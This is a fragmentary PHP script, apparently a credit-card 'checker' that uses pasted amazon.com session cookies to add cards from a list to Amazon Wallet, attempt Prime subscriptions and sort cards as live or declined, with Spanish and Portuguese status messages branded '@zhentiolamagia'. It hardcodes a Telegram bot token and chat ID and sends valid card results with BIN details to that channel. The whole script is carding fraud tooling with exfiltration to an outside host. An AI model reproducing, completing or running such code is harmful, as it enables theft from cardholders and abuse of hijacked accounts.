...
function enviarTelegram($mensaje) {
    $botToken = "8611373580:AAGdBiDVp5qK-WBmlrzVf2oKge2-HuvRS_U"; // Pon tu token entre las comillas
    $chatId = "-1003778786216";     // Pon tu ID de chat o canal
...
die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}
...
die("¡Coloque las cookies de amazon.com en el formulario!");    
...
// die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey. Haz clic en "Mi cuenta", luego "Seguridad" e inicia sesión de nuevo. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey. Haz clic en "Mi cuenta", luego "Seguridad" e inicia sesión de nuevo: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Errores</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies no detectadas. Entra en "Mi Cuenta" > "Seguridad" e inicia sesión para reactivarlas. </span> ➔ Latencia: (' . (rand(100, 500)) . 'ms) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
}
...
if (empty($addresid)) {
    ...
    if (empty($addresid)) {
        die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Um endereço foi cadastrado, confira em sua conta e tente novamente. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
    }
}
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al agregar tarjeta de crédito. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro ao acessar AmazonWallet. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Erro al obtener tarjeta vinculada. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo en la suscripción de Amazon Prime.. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al generar la transacción con la tarjeta. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Fallo en obter walletid2. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Falla en obtener walletid. </span> ➔ Tiempo de resposta: (' . (time() - $time) . 's) ➔ <span class="text-warning">@zhentiolamagia</span><br>');
...
if (strpos($Fim, 'We’re sorry. We’re unable to complete') || strpos($Fim, 'Lo lamentamos. No podemos completar')) {
    ...
    $texto_telegram .= "┉┉┉┉┉┉ • ┉┉┉┉┉┉\n";
    $texto_telegram .= "⼥| Info: $infobin\n";
    
    enviarTelegram($texto_telegram); // Manda la Live al canal
    // ------------------------------
